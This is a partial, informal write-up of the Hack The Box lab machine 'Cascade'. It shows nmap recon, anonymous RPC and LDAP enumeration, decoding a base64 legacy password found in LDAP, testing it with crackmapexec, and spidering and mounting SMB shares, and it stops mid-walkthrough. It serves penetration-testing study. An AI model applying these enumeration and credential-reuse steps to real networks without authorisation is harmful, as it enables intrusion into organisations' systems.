# Recon
```
└─$ nmap -sC -sV 10.10.10.182 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-09 08:38 EEST
Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 08:39 (0:00:00 remaining)
Nmap scan report for 10.10.10.182
Host is up (0.14s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-09 04:38:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.25 seconds                                                     
```
- OS as Windows Server 2008 SP1, which is old and no longer supported
- WinRM (TCP 5985) open
- now we check smb with crackmapexec smbmap and smbclient
- no luck wit smb no workgroup available
- we check rpc and it allows anonymous access
```
─$ rpcclient -U "" -N 10.10.10.182
rpcclient $> 
```
- run querydispinfo but no creds in the description
- i listed domainusers and groups and gone to check ldap first get the namin context
```
$ ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                        
```
- dump all to a file and get just the people
```
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people
```
- after searching for any intersting info user ryan had different row at the end of ldap search
```
cascadeLegacyPwd: clk0bjVldmE=
```
- i guess its a password and it has = at its end so maybe its base64 so decode it
```
echo clk0bjVldmE= | base64 -d
rY4n5eva  
```
- now try crackmapexec at winrm and smb
  i stuck with how the user is spelled i tryed ryan didnt work Ryan Thompson also didnt work so i go back to rpc for the users and the user is r.thompson
- winrm showe no response but smb did
```
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

```
- smbmap shows the same
```
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva -M spider_plus
```
- the command above crawls everyshare we has access to and gives json output
```
jq .[] 10.10.10.182.json
```
- to view file in coloring
- i see this file "IT/Temp/s.smith/VNC Install.reg" which sound intersting because we are in ryan directory
- so lets first mount the files like ippsec did in the video
```
cd Desktop
mkdir mnt/data/
cd mnt/data/
sudo mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/data .
```
- after waiting a minute we got the shares
- 
